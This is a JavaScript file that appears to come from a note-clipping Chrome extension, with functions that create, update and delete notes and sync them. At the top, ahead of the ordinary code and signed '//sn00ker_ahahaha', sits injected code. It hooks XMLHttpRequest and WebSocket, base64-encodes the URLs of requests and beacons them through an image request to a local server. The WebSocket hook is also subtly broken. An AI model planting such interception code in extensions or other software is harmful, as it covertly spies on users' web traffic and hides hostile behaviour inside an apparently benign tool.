function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var _cl_notes = {

  /**
   * Create new note in DB and Sync
   * @param data {user, noteProperties}
   * @param tabId
   *
   */
  onCreateNewNote: function (tabId, data) {

    console.log('onCreateNewNote');

    var noteProperties = data.noteProperties,
      isSync = data.isSync,
      user = data.user;

    // update tabs on change
    data['actionType'] = 'create';
    _cl_eventPage.sendMessageToAllTabs('clipto-note-updated', data);

    var promisesArray = [
      _database.createDocument_Promise(noteProperties),
      _storage.updateUserTags_Promise(noteProperties.localUserId, noteProperties.tags, true),
      _cl_tabs.runHighlights(tabId, noteProperties)
    ];

    Promise.all(promisesArray).then(function () {

      if (user.isSyncUser && isSync) {
        //return _remote_database.syncListener(noteProperties.dbId);
        return _remote_database.createRemoteDocument_Promise(noteProperties, noteProperties.dbId)
      }
    })
  },

  /**
   * updates by 'put' the note in db with the update verb
   * @param tabId
   * @param data {user, noteProperties}
   */
  onUpdateNote: function (tabId, data) {

    console.log('updating note');
    var noteProperties = data.noteProperties,
      user = data.user,
      isSync = data.isSync;

    // update tabs on change
    data['actionType'] = 'update';
    _cl_eventPage.sendMessageToAllTabs('clipto-note-updated', data);

    var promisesArray = [
      _database.updateDocument_Promise(noteProperties),
      _storage.updateUserTags_Promise(noteProperties.localUserId, noteProperties.tags, true),
      _cl_tabs.runHighlights(tabId, noteProperties)
    ];

    // update remote
    return Promise.all(promisesArray).then(function () {
      if (user.isSyncUser && isSync) {
        return _remote_database.updateRemoteDocument_Promise(noteProperties, noteProperties.dbId)
          .catch(function (err) {
            if (err.status && err.status === 404) {
              return _remote_database.syncDb_Promise(noteProperties.dbId, noteProperties.dbId)
            }
          })
      }
    })

  },

  /**
   * receives note properties as data
   * @param data
   * @param tabId
   */
  onDeleteNote: function (tabId, data) {

    console.log('delete note');
    var noteProperties = data.noteProperties,
      user = data.user,
      isSync = data.isSync !== false; // false if false , otherwise true

    // update tabs on change
    data['actionType'] = 'delete';
    _cl_eventPage.sendMessageToAllTabs('clipto-note-updated', data);

    return _database.removeDocument_Promise(noteProperties).then(function () {
      //remove the highlight if exists
      return Promise.all(noteProperties.items.map(function (item) {

        if (item.highlightText) {
          try {
            return _cl_tabs.message_deleteHighlight_Promise(tabId, item.itemId)
          } catch (e) {
            console.log("Exception deleting highlight from DOM");
          }
        }
      })).then(function () {
        if (user.isSyncUser && isSync) {
          return _remote_database.deleteRemoteDocument_Promise(noteProperties, noteProperties.dbId)
            .catch(function (err) {
              if (err.status && err.status === 404) {
                // WE DO NOTHING IN CASE OF DELETE 404.. ITS ALREADY MISSING
              }
            })
        }
      })

    })
  }

};